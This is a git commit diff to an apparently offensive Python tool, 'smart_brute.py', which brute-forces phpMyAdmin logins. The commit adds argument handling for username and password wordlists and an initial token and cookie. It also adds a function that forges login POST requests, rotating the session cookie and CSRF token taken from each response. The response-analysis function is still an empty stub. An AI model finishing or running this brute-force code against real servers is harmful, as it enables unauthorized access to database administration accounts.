6da63af3b782437b1889230576faad548a90d30e
jonnyzar <some@jonnyzar.com>
2023-02-13 00:28:09 +0100

    brute

--- WebTools/smart_brute.py
+++ WebTools/smart_brute.py
@@ -35,7 +35,7 @@ set_session=51094657b2bc41758bccb0c61d6d6da1&pma_username=sdfg&pma_password=sdfg
 So need to write a python program that does following:
 
 1. grabs from every response the token from html body 
-AND second cookie which is not equal to the cookie from initial GET or POST request
+AND second cookie in RESPONSE which is not equal to the cookie from initial POST request
 
 2. make a POST request with
 
@@ -52,10 +52,53 @@ import sys
 URL = sys.argv[1]
 USER_FILE = sys.argv[2]
 PASS_FILE = sys.argv[3]
+INIT_TOKEN = sys.argv[4]
+INIT_COOKIE = sys.argv[5]
+
+def forge_request(url, token, resp_cookie, username, password):
+
+    if resp_cookie:
+        current_cookie = resp_cookie
+    else:
+        current_cookie = INIT_COOKIE
+
+    payload ={
+        "set_session" : current_cookie,
+        "pma_username" :  username,
+        "pma_password" : password,
+        "server" : 1,
+        "target" : "index.php",
+        "lang" : "en",
+        "debug" : 0,
+        "token" : token
+    }
+
+
+    cookie = {
+        "phpMyAdmin":current_cookie,
+    }
+
+    resp = requests.post(url, data=payload, cookies=cookie)
+
+    return resp
+
+def analyze_resp(resp):
+    
+
+
+    return 0
+
+
 
 def main():
 
-    print(f"Bruting for {URL}\n with users in {USER_FILE}\n and passwords in {PASS_FILE}")
+    print(f"Bruting for {URL}\n"
+    f"users in {USER_FILE}\n"
+    f"passwords in {PASS_FILE}\n"
+    f"initial Token: {INIT_TOKEN}\n"
+    f"initial Cookie: {INIT_COOKIE}")
+
+    resp_cookie = False
 
     return 0
 
